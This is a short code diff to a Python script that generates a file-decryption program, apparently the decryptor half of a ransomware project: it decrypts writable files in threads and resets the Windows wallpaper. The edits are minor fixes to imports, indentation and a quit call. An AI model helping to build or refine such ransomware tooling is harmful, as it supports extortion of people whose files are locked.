@@ -108,6 +108,7 @@ def crypt():
     program_code = '''
 import os
 import sys
+import ctypes
 from threading import Thread
 
 # adding Folder_2 to the system path
@@ -144,18 +145,16 @@ def decyptionalgorithme(key):
                     else:
                         if os.access(file, os.W_OK) and os.access(file, os.R_OK):
                             try:
-                                Thread(target=decrypt_file, args=(file, finalkey)).start()
+                                Thread(target=decrypt_file, args=(file, finalkey,)).start()
                                 print(file, " : decrypted successfully ")
                             except:
                                 print("ignoring error on decrypting this file : ", file)
                         else:
                             print("access denied to this file : ", file)  
     
-import ctypes
-SPI_SETDESKWALLPAPER = 20
-
-# Set the wallpaper to the default Windows background image
-ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", 0)
+    SPI_SETDESKWALLPAPER = 20
+    # Set the wallpaper to the default Windows background image
+    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg", 0)
 
 def decrypt():
     hostname = []
@@ -243,7 +242,6 @@ decrypt()
 
     print("image set")
 
-    root.quit()
 
 
 i = 1
